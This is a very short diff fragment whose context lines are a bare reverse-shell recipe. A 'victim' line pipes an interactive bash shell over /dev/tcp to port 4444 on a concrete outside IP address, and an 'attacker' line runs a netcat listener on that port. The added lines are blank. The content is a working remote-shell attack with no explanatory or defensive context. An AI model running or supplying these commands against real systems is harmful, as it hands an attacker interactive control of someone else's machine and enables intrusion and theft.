@@ -1,2 +1,7 @@
 victim => bash -i >& /dev/tcp/34.16.169.11/4444 0>&1
 attacker =>  nc -lvnp 4444
+
+
+
+
+
